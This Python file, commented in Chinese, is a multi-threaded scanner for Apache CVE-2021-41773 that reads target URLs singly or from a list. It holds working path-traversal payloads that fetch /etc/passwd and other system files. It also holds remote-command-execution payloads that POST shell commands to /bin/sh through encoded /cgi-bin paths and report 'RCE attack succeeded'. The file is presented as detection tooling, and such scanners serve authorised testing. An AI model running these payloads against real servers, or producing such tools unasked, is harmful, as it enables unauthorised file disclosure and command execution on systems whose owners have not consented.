#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Apache CVE-2021-41773 路径遍历漏洞自动化检测脚本
Author: Security Team
Date: 2025-01-25
"""

import requests
import argparse
import sys
import time
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

class ApacheCVE2021_41773Scanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
        # 测试路径列表
        self.test_paths = [
            '/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '/icons/..%2e..%2e..%2e..%2e/etc/passwd',
            '/manual/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/proc/version',
            '/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts'
        ]
        
        # RCE测试路径
        self.rce_paths = [
            '/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh',
            '/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
        ]

    def check_vulnerability(self, target_url):
        """检测单个目标是否存在CVE-2021-41773漏洞"""
        results = {
            'url': target_url,
            'vulnerable': False,
            'path_traversal': False,
            'rce_possible': False,
            'details': []
        }
        
        print(f"[*] 正在检测: {target_url}")
        
        # 检测路径遍历
        for path in self.test_paths:
            try:
                full_url = urljoin(target_url, path)
                response = self.session.get(full_url, timeout=10)
                
                if response.status_code == 200:
                    content = response.text.lower()
                    # 检查是否包含/etc/passwd的特征内容
                    if 'root:' in content and '/bin/' in content:
                        results['vulnerable'] = True
                        results['path_traversal'] = True
                        results['details'].append({
                            'type': 'Path Traversal',
                            'path': path,
                            'status': response.status_code,
                            'evidence': 'Found /etc/passwd content'
                        })
                        print(f"[+] 路径遍历成功: {path}")
                        break
                    elif 'linux' in content and 'version' in content:
                        results['vulnerable'] = True
                        results['path_traversal'] = True
                        results['details'].append({
                            'type': 'Path Traversal',
                            'path': path,
                            'status': response.status_code,
                            'evidence': 'Found /proc/version content'
                        })
                        print(f"[+] 路径遍历成功: {path}")
                        break
                        
            except requests.RequestException as e:
                continue
        
        # 检测RCE可能性
        if results['path_traversal']:
            for rce_path in self.rce_paths:
                try:
                    full_url = urljoin(target_url, rce_path)
                    test_data = "echo Content-Type: text/plain; echo; id"
                    response = self.session.post(full_url, data=test_data, timeout=10)
                    
                    if response.status_code == 200:
                        content = response.text
                        if 'uid=' in content and 'gid=' in content:
                            results['rce_possible'] = True
                            results['details'].append({
                                'type': 'RCE',
                                'path': rce_path,
                                'status': response.status_code,
                                'evidence': 'Command execution successful'
                            })
                            print(f"[+] RCE攻击成功: {rce_path}")
                            break
                            
                except requests.RequestException as e:
                    continue
        
        return results

    def scan_targets(self, targets, max_threads=10):
        """批量扫描目标"""
        results = []
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            future_to_url = {
                executor.submit(self.check_vulnerability, target): target 
                for target in targets
            }
            
            for future in as_completed(future_to_url):
                try:
                    result = future.result()
                    results.append(result)
                except Exception as e:
                    print(f"[-] 扫描失败: {future_to_url[future]} - {e}")
        
        return results

    def generate_report(self, results):
        """生成扫描报告"""
        print("\n" + "="*60)
        print("Apache CVE-2021-41773 漏洞扫描报告")
        print("="*60)
        
        vulnerable_count = sum(1 for r in results if r['vulnerable'])
        total_count = len(results)
        
        print(f"扫描目标总数: {total_count}")
        print(f"存在漏洞数量: {vulnerable_count}")
        print(f"漏洞检出率: {vulnerable_count/total_count*100:.1f}%")
        print()
        
        for result in results:
            if result['vulnerable']:
                print(f"[!] 发现漏洞: {result['url']}")
                print(f"    路径遍历: {'是' if result['path_traversal'] else '否'}")
                print(f"    RCE可能: {'是' if result['rce_possible'] else '否'}")
                
                for detail in result['details']:
                    print(f"    - {detail['type']}: {detail['path']} ({detail['evidence']})")
                print()

def main():
    parser = argparse.ArgumentParser(
        description='Apache CVE-2021-41773 漏洞自动化检测工具',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  python3 apache_cve_2021_41773_scanner.py -u http://target.com
  python3 apache_cve_2021_41773_scanner.py -f targets.txt
  python3 apache_cve_2021_41773_scanner.py -u http://target.com -t 20
        """
    )
    
    parser.add_argument('-u', '--url', help='单个目标URL')
    parser.add_argument('-f', '--file', help='目标列表文件')
    parser.add_argument('-t', '--threads', type=int, default=10, help='线程数量 (默认: 10)')
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)
    
    scanner = ApacheCVE2021_41773Scanner()
    targets = []
    
    if args.url:
        targets.append(args.url)
    
    if args.file:
        try:
            with open(args.file, 'r') as f:
                file_targets = [line.strip() for line in f if line.strip()]
                targets.extend(file_targets)
        except FileNotFoundError:
            print(f"[-] 文件不存在: {args.file}")
            sys.exit(1)
    
    if not targets:
        print("[-] 没有找到有效的目标")
        sys.exit(1)
    
    print(f"[*] 开始扫描 {len(targets)} 个目标...")
    results = scanner.scan_targets(targets, args.threads)
    scanner.generate_report(results)

if __name__ == "__main__":
    main() 